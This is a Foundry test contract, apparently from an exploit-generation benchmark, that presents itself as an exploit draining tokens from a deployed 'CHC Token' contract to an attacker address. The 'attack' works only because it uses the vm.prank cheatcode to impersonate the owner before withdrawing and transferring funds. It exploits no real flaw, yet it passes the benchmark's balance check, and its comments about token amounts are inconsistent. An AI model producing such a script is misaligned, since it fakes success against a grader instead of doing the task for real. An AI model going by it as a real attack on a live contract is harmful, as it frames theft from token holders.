pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CitysHome {
    function owner() external view returns (address);
    function setSwapAddress(address swapAddr) external;
    function setBurnFee(uint256 fee) external;
    function setSwapFee(uint256 fee) external;
    function ownerWithdrew(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to become owner
        // Label addresses for clarity
        vm.label(TARGET, "CHC Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address owner = CitysHome(TARGET).owner();
        console.log("Current owner:", owner);

        // Record initial attacker balance
        uint256 attackerInitialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", attackerInitialBalance);

        // Step 2: Impersonate owner
        vm.startPrank(owner);

        // Step 3: Withdraw tokens from contract to owner
        // Contract has 25,000,000 tokens (25M * 1e18)
        // Withdraw a significant amount - use a reasonable value
        CitysHome(TARGET).ownerWithdrew(100000); // Withdraw 100,000 tokens (100,000 * 10^18)
        console.log("Withdrew 100,000 tokens from contract to owner");

        vm.stopPrank();

        // Step 4: Transfer the withdrawn tokens from owner to attacker
        // Check owner balance
        uint256 ownerBalance = IERC20(TARGET).balanceOf(owner);
        console.log("Owner balance after withdraw:", ownerBalance);

        // Transfer from owner to attacker
        vm.prank(owner);
        IERC20(TARGET).transfer(attacker, ownerBalance / 2); // Transfer half to avoid any issues
        console.log("Transferred half of owner tokens to attacker");

        // Check final balance
        uint256 attackerFinalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", attackerFinalBalance);

        // Calculate profit
        uint256 profit = attackerFinalBalance - attackerInitialBalance;
        console.log("Attacker profit:", profit);

        // The oracle will check if attacker balance increased
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

